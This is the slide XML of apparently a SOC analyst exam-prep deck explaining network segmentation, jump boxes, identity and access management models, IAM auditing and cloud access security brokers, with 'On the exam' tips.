              <a:t>•  Maintaining inventory and configuration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Asset tagging</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PROTECTING YOUR TERRITORY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Network Segmentation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Network segmentation is the process of dividing one large network into smaller subnetworks or zones, typically using VLANs, subnets, firewalls, or physical separation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It improves manageability and traffic performance while limiting an attacker's ability to move laterally, since a compromised host in one segment cannot freely reach systems in another.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Segmentation can be applied at multiple OSI and TCP/IP layers, for example physical-layer separation using distinct interconnecting devices and cabling, or data-link-layer separation using VLANs and access control lists.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because well-placed segments contain breaches, protect high-value assets like domain controllers or cardholder data, and create enforceable inspection points for monitoring.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions on containing lateral movement and isolating sensitive systems, and on choosing the correct segmentation technique (VLAN, subnet, physical) for a given zone.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PROTECTING YOUR TERRITORY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Network Segmentation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What is network segmentation?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  The process of breaking down large networks into smaller networks/zones</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  What does it do?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Improves management of network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Improves traffic across network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Prevents attacker from moving across networks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PROTECTING YOUR TERRITORY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Network Segmentation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Achievable across all OSI &amp; TCP/IP layers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Physical layer segmentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Separate networks &amp; devices connected to separate interconnecting devices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Link layer segmentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  VLANs allows multiple devices across multiple networks to be connected to the same physical device</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Manage traffic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Ensure segmentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Verify hard isolation across networks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PROTECTING YOUR TERRITORY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Jump Box/Server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A jump box (also called a jump server or bastion host) is a hardened, tightly controlled system that acts as the single entry point for administrators to reach a secured or segmented network zone.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By channelizing all administrative access through this one host, an organization can enforce strong authentication, log every session, and restrict which internal systems are reachable, making the jump box a natural monitoring and auditing choke point.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts value it because any administrative activity to sensitive segments should flow through and be recorded at the jump box, so anomalous logins or commands there are a high-fidelity signal of compromise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect the jump box to appear as the correct control for secure, monitored administrative access into a segmented or high-value network.</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PROTECTING YOUR TERRITORY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Jump Box/Server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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Channelizing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Monitoring</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_7c675dab12.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2536629"/>
            <a:ext cx="4937760" cy="2790582"/>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IDENTITY AND ACCESS MANAGEMENT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Identity and Access Management (IAM)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Identity and Access Management (IAM) is the framework for establishing who a user is and controlling what they may do, spanning identification, authentication, and authorization.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Identification claims an identity, authentication proves it using factors such as a password, PIN, token, or biometric, and authorization then grants only the privileges that identity is permitted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  IAM manages the full identity lifecycle, from registering a new user and provisioning credentials to privilege management and eventual deprovisioning when access is no longer needed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC, IAM is central because compromised or over-privileged accounts are a primary attack vector, and strong identity controls plus clean provisioning reduce both the attack surface and the blast radius of a breach.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam distinguishes identification vs authentication vs authorization and tests IAM lifecycle and least-privilege concepts as mitigations.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IDENTITY AND ACCESS MANAGEMENT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Identity and Access Management (IAM)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Determining a user’s identity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Identification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Authentication</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IDENTITY AND ACCESS MANAGEMENT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Identity and Access Management (IAM)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Managing identities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Register as new user</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Provide credentials</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Authentication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Password, PIN, token, biometrics, etc.</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IDENTITY AND ACCESS MANAGEMENT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Identity and Access Management (IAM) (3)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Privilege management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Authorization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Providing resource access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  The key is authentication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Multi Factor authentication (MFA)</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IDENTITY AND ACCESS MANAGEMENT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Identity and Access Management (IAM) (4)</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Single sign-on (SSO)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Using a single identity across several applications or organizations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Security Assertion Markup Language (SAML)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Manages and transports SSO credentials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IDENTITY AND ACCESS MANAGEMENT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Identity and Access Management (IAM) (5)</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Federated identification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Using a single identity across several organizations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  User identifies/ authenticates with a central identity manager</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Example: OpenID</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IDENTITY AND ACCESS MANAGEMENT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IAM Methods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IAM enforcement uses distinct access control models. Role-based access control (RBAC) assigns users to roles or groups and grants object permissions to those roles, so access follows job function.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Attribute-based access control (ABAC) grants permissions dynamically by evaluating attributes of the subject, object, action, and environment, allowing fine-grained, context-aware policies.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Mandatory access control (MAC) is a rigid model where subjects hold clearances and objects carry classification labels, and the system, not the resource owner, enforces access based on those labels.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts must recognize each model because the enforcement style determines how privileges are audited, how least privilege is achieved, and how a misconfiguration could expose data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect to match RBAC, ABAC, MAC (and DAC) to a described access-control requirement or to identify the model that best enforces least privilege.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IDENTITY AND ACCESS MANAGEMENT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IAM Methods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Role-based access control (RBAC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Users (subjects) belong to one or more roles (groups)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Object permissions are granted based on role</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Attribute-based access control (ABAC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Users (subjects) possess descriptive attributes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Object permissions are granted based on attributes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IDENTITY AND ACCESS MANAGEMENT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IAM Methods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Mandatory access control (MAC)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Subjects have clearances</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Objects have classifications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IDENTITY AND ACCESS MANAGEMENT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IAM Auditing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IAM auditing is the periodic review of identities, entitlements, and access activity to confirm that permissions still match legitimate need and that no unauthorized changes have occurred.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because automated provisioning can drift and attackers create or escalate accounts, manual review of privileged accounts, group memberships, and access logs is often necessary to spot subtle malicious behavior.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For the SOC, regular access recertification and log review surface orphaned accounts, privilege creep, and indicators of account misuse before they enable a larger compromise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam frames IAM auditing and access recertification as detective controls for privilege creep, orphaned accounts, and unauthorized escalation.</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IDENTITY AND ACCESS MANAGEMENT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IAM Auditing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Manual review</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Necessary to identify malicious behavior</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IDENTITY AND ACCESS MANAGEMENT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Cloud Access Security Broker (CASB)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A Cloud Access Security Broker (CASB) is a security enforcement point that sits between users and cloud services, inspecting and controlling traffic to and from SaaS, PaaS, and IaaS platforms.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It is built on four pillars: visibility into who is accessing which cloud resources, threat protection to detect and block malicious activity, compliance controls to meet regulatory requirements, and data security to protect sensitive information such as through DLP and encryption.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  CASBs deploy inline as a forward or reverse proxy or out-of-band via API integration, giving analysts a way to discover shadow IT and enforce consistent policy across otherwise unmanaged cloud usage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOCs rely on CASBs because cloud adoption moves data outside the traditional perimeter, and the CASB restores visibility and control over that traffic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Know the four CASB pillars and that a CASB is the control for visibility, DLP, and policy enforcement over cloud/SaaS usage and shadow IT.</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IDENTITY AND ACCESS MANAGEMENT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Cloud Access Security Broker (CASB)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CASB runs between users and cloud services</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Four CASB pillars</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Visibility – subject/object access transparency</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
